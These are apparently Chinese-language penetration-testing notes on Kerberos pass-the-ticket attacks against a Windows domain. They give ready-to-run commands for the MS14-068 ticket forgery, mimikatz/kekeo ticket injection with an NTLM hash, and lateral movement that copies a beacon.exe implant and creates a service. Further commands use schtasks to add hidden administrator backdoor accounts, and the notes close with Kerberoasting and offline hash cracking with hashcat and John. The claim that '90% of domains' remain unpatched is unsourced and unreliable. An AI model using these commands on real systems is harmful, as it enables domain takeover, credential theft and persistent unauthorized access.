# PTT(票据传递)
**1.漏洞-MS14-068(管理员权限)-利用漏洞新生成的身份票据尝试认证**
漏洞-MS14-068是密钥分发中心(KDC)服务中的windows漏洞
![](vx_images/415024933194871.png)
CS中实现:shell 命令
获取sid值:
```
shell whoami/user
```
生成票据文件:
```
shell ms14-068.exe -u webadmin@god.org -s (sid) -d (ip) -p (明文密码)
```
清楚票据连接:
```
shell klist purge
```
内存导入票据:
```
minikatz kerberos::ptc TGT_webadmin@god.rog.ccache
```
连接目标上线:(计划任务)
```
shell dir \\(目标计算机名)\c$
shell net use \\(....)\c$
copy beacon.exe \\(....)\c$
sc \\(...) create bindshell binpath "c:\beacon.exe"
sc \\(...) create start bindshell
```
成因:目标是否存在ms14-068

**2.利用NTML**
![](vx_images/1905577705258.png)
生成票据
```
shell kekeo "tgt::ask /user:administrator /domain:god.org /ntlm:e2b475c11da2a0748290d87aa966c327" "exit"
```
导入票据
```
kerberos::ptt ___administrator@god.org.kirbi
```
查看票据
```
klist  # 系统命令查看票据
或
kerberos::list  # mimikatz 查看票据
```
利用票据连接
```
# 创建一次性计划任务执行命令
schtasks /create /s <TARGET_IP> /tn "TempTask" /sc once /st 00:00 /ru System /tr "cmd.exe /c <COMMAND>" /f

# 立即运行任务
schtasks /run /s <TARGET_IP> /tn "TempTask"

在目标创建后门用户
schtasks /create /s 192.168.1.10 /tn "Backdoor" /sc once /st 00:00 /ru System `
  /tr "net user Hacker P@ssw0rd /add && net localgroup administrators Hacker /add" /f

schtasks /run /s 192.168.1.10 /tn "Backdoor"
```



**3.利用历史遗留**利用转发拿免费门票
历史票据有效期通常为 ​10小时

检查当前票据
```
klist  # 系统命令查看票据缓存
或
mimikatz # kerberos::list  # 使用 mimikatz 查看详情
```
注入历史票据
```
mimikatz # kerberos::ptt "C:\Legacy_Ticket\backup_admin.kirbi"
```
通过计划任务执行横向移动
```
# 在目标主机创建管理员后门账户
schtasks /create /s 192.168.10.5 /u administrator /tn "SystemUpdate" `
  /sc weekly /tr "net user pentest P@ssw0rd123! /add && net localgroup administrators pentest /add" /f

schtasks /run /s 192.168.10.5 /u administrator /tn "SystemUpdate"
```

**4.Rubeus&impacket(高权限,需Ticket)-利用通讯的加密类型票据进行爆破明文**
攻击本质​
通过 ​合法请求服务票据(TGS)​​ → 抓取使用 ​服务账户密码加密的票据​ → ​离线爆破加密密钥​ → 获取服务账户明文密码

kerbroas攻击条件
```
域成员权限​：拥有域内任意用户（即使低权限）的账号/密码/NTLM
​SPN 服务存在​：域内存在注册了 SPN（服务主体名称）的服务账户
常见服务：MSSQL、HTTP、CIFS、Exchange 等
​弱密码账户​：服务账户设置了可爆破的弱口令（概率极高）
攻击过程 ​无需高权限，普通域用户即可操作！
```
Kerberoasting攻击利用:

探测SPN服务账户
```
# Windows (PowerShell)
Import-Module .\Rubeus.exe
Rubeus kerberoast /stats

# Linux (Impacket)
GetUserSPNs.py -dc-ip 192.168.1.1 god.org/user:Password123



output:
ServicePrincipalName : MSSQLSvc/db.god.org  
SamAccountName       : svc_sql  
PasswordLastSet      : 2024-01-15  
SupportedEncryption  : aes256-cts-hmac-sha1-96, rc4-hmac  # 重点关注RC4
```
请求服务票据
```
# 请求指定SPN的票据（强制RC4加密）
Rubeus kerberoast /spn:"MSSQLSvc/db.god.org" /tgtdeleg /rc4opsec /nowrap

获取加密票据
$krb5tgs$23$*svc_sql$GOD.ORG$MSSQLSvc/db.god.org* 
$B7E9F50EDC... # 完整RC4-HMAC密文
```
离线爆破票据
```
# 使用Hashcat爆破（需NVIDIA显卡加速）
hashcat -m 13100 -a 0 krb_tgs.txt rockyou.txt 

# 参数说明：
# -m 13100 = Kerberos TGS-REP (RC4加密类型)
# -a 0     = 字典攻击模式

或
# John the Ripper爆破（CPU模式）
john --format=krb5tgs --wordlist=passwords.txt krb_tgs.hash



结果:
$krb5tgs$23$...:Password!@# 
```

5.重写攻击
重写攻击依赖于协议设计漏洞（微软编号ADV220002），在打过补丁的域控环境下可能失效，但实战中 ​90%的域未修复此漏洞。